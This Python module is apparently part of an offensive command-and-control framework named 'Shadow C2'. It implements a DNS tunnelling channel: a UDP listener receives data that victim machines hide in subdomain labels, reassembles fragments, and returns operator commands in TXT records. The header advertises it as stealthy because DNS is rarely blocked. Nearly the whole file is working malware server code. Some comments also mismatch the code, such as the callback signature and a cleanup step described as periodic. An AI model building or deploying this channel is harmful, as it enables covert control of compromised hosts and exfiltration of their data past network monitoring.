#!/usr/bin/env python3
"""
Shadow C2 — DNS Tunneling Channel
Encodes C2 data in DNS subdomain labels. Runs UDP listener on configurable port.
Low bandwidth but extremely stealthy — DNS traffic is rarely blocked.
"""

import socket
import struct
import threading
import logging
import base64
import time
from typing import Optional, Callable

from server.c2.channels import BaseChannel
from server.c2.protocol import FragmentManager, Fragment
from server.utils.network import (
    parse_dns_query_packet, build_dns_response_packet,
    decode_dns_labels
)
from server.config import DNS_PORT, DNS_DOMAIN

logger = logging.getLogger("shadow_c2.channel.dns")


class DNSChannel(BaseChannel):
    """
    C2 over DNS queries.
    - Victim encodes data as hex subdomain labels: <hex_data>.c2.example.com
    - Server responds with TXT records containing base64-encoded commands
    - Fragment manager handles messages > 200 bytes
    """

    def __init__(self, port: int = DNS_PORT, domain: str = DNS_DOMAIN,
                 handler_callback: Callable = None):
        self.port = port
        self.domain = domain
        self.handler_callback = handler_callback  # fn(victim_uuid, data) -> response_bytes
        self._socket: Optional[socket.socket] = None
        self._thread: Optional[threading.Thread] = None
        self._running = False
        self._fragment_mgr = FragmentManager()

    @property
    def channel_type(self) -> str:
        return "dns"

    @property
    def priority(self) -> int:
        return 3

    @property
    def bandwidth_estimate(self) -> str:
        return "very_low"

    def start(self):
        """Start DNS listener."""
        try:
            self._socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self._socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._socket.bind(("0.0.0.0", self.port))
            self._socket.settimeout(1.0)
            self._running = True

            self._thread = threading.Thread(target=self._listen_loop, daemon=True)
            self._thread.start()
            logger.info(f"DNS channel listening on UDP:{self.port} (domain: {self.domain})")
        except Exception as e:
            logger.error(f"Failed to start DNS channel: {e}")
            self._running = False

    def stop(self):
        self._running = False
        if self._socket:
            try:
                self._socket.close()
            except Exception:
                pass
        if self._thread:
            self._thread.join(timeout=3)

    def is_alive(self) -> bool:
        return self._running and self._thread is not None and self._thread.is_alive()

    def _listen_loop(self):
        """Main listener loop — parse DNS queries, extract data, respond."""
        while self._running:
            try:
                data, addr = self._socket.recvfrom(4096)
                if not data:
                    continue

                parsed = parse_dns_query_packet(data)
                if not parsed:
                    continue

                qname = parsed["qname"]
                tid = parsed["transaction_id"]
                qtype = parsed["qtype"]

                # Check if query is for our domain
                if not qname.endswith(self.domain) and not qname.endswith(self.domain + "."):
                    continue

                # Extract data from subdomain labels
                try:
                    payload = decode_dns_labels(qname, self.domain)
                except Exception:
                    continue

                # Check if it's a fragment
                if len(payload) >= 6:
                    frag = Fragment.unpack(payload)
                    if frag:
                        reassembled = self._fragment_mgr.add_fragment(frag)
                        if reassembled is None:
                            # Send ACK — not all fragments received yet
                            ack = b"ACK"
                            response_pkt = build_dns_response_packet(
                                tid, qname, qtype, ack)
                            self._socket.sendto(response_pkt, addr)
                            continue
                        payload = reassembled

                # Process payload through handler
                response_data = b""
                if self.handler_callback and len(payload) > 0:
                    try:
                        response_data = self.handler_callback(payload) or b""
                    except Exception as e:
                        logger.error(f"DNS handler error: {e}")
                        response_data = b"ERR"

                # Build DNS response with TXT record
                response_pkt = build_dns_response_packet(
                    tid, qname, qtype, response_data)
                self._socket.sendto(response_pkt, addr)

            except socket.timeout:
                continue
            except Exception as e:
                if self._running:
                    logger.error(f"DNS listener error: {e}")
                    time.sleep(0.1)

        # Cleanup stale fragments periodically
        self._fragment_mgr.cleanup_stale()
